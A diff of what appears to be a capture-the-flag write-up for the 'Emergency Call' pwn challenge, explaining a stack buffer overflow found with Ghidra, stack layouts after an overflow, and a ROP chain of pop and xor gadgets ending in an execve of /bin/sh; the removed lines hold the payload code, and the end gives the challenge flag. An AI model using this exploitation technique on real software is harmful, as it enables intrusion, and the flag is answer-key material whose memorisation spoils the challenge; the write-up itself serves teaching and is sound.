@@ -1,20 +1,27 @@
+# Emergency Call
+
+## Description
+> Questa non è un esercitazione! Ripeto. Questa non è un esercitazione!!! Hai una sola chiamata di emergenza, quindi usala bene.
+Puoi collegarti al servizio remoto con:<eol>
+nc emergency.challs.olicyber.it 10306
+
+## Solution
+Thanks to Ghidra we can easily notice an out of bounds write in the request of the emergency. We are asked for the input trought a *read_syscall* with maximum *size* of 128 and it will be saved in a *char array* of *length* 32.
+
+That's the output of the `checksec` command
+```bash
+	RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+Having No PIE means that the base of our binary will always be the same in every execution, so we exactly know the address of every assembly operation, even on the remote service.<br>
+
+Let's better analyze the program locally by sending this payload as second input 
 ```python
 payload = b'A'*32 + b'B'*8 + b'C'*8 + b'D'*16
-payload = flat(
-	b'A'*32,
-	b'B'*8,
-	p64(pop_rdi),
-	p64(0x59),
-	p64(xor_rax_rdi),
-	p64(pop_rdi),
-	p64(first_input),
-	p64(pop_rsi),
-	p64(0x0),
-	p64(pop_rdx),
-	p64(0x0),
-	p64(syscall),
-)
 ```
+This is how the stack looks right after we send our payload
 |register|address|value|ascii
 |-|-|-|-|
 |rsp|0xfe158|0x4010e0
@@ -26,8 +33,13 @@ payload = flat(
 |ret_addr|0xfe188|input + 40 (0x4343434343434343)|CCCCCCCC
 ||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
 ||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
-<br>Calling the return will do the following
-- `mov rsp,rbp`, delete the last frame
+
+<br>`RIP` now points to `0x401031` which contains `ret` instruction.
+This `ret` instruction execute `pop rip`.
+
+Now `RIP` points to `0x4010e0` which is `return 0`, executing this will do as following:
+- `mov rax, 0` , the stack does not get affected
+- `mov rsp, rbp` which delete the last frame
 
 |register|address|value|ascii
 |-|-|-|-|
@@ -35,9 +47,10 @@ payload = flat(
 |ret_addr|0xfe188|input + 40 (0x4343434343434343)|CCCCCCCC
 ||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
 ||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
+
 <br>
 
-- `pop rbp`, pop from the stack to `rbp` and move  `rsp` to the next address
+- `pop rbp` which pop from the stack to `RBP` and move  `RSP` to the next address
 
 |register|address|value|ascii
 |-|-|-|-|
@@ -45,13 +58,45 @@ payload = flat(
 ||0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
 ||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
 |rbp|0x4242424242424242|
+
 <br>
 
-- `ret`, set `rip` to the value of `rsp` and move `rsp` to the next address
+- and `ret` which is basically a `pop rip`
 
 |register|address|value|ascii
 |-|-|-|-|
 |rsp|0xfe190|input + 48 (0x4444444444444444)|DDDDDDDD
 ||0xfe198|input + 56 (0x4444444444444444)|DDDDDDDD
 |rbp|0x4242424242424242|
-`rip` = `0x4343434343434343`
+
+
+<br>
+
+`RIP` = `0x4343434343434343`.
+
+At this point, knowing that we have control over the return address, we can adapt the payload to our needs.
+We can exploit this using ROP due to the fact that the program was compiled without PIE.
+<br>
+Our goal is to make an *execve_syscall* of `/bin/sh`, by looking at [x86-64 syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) we know that the register should be as following:
+|register|arg|value
+|-|-|-|
+|RAX|syscall number|0x3b|
+|RDI|const char *filename|"/bin/sh"|
+|RSI|const char *const *argv|0x0
+|RDX|const char *const *envp|0x0
+
+We can start searching for gadgets using
+```bash
+ROPgadget --binary=emergency-call | grep rax
+```
+We can use `xor rax, rdi; ret` to assign the correct value to `RAX`.
+We know that `RAX` is equal to `0x0` because of the `return 0` operation, so `RDI` must be `0x3b` before we call the `xor` instruction.
+
+We can use `pop rdi; ret` gadget to achieve this and then do the operation.
+
+The next step is to assign to `RDI` the address of a *char array* containing "/bin/sh/", there's no string in the program which contains this but we can send "/bin/sh" as first input and then use its location.
+
+Now we still need to set `RSI` and `RDX` to `0x0` and we can get this with this two gadgets:  `pop rsi; ret` and `pop rdx; ret`.
+
+## Flag
+`flag{Th3_b35T_em3Rg3nCy_C4ll_1s_Sy5c411!}`
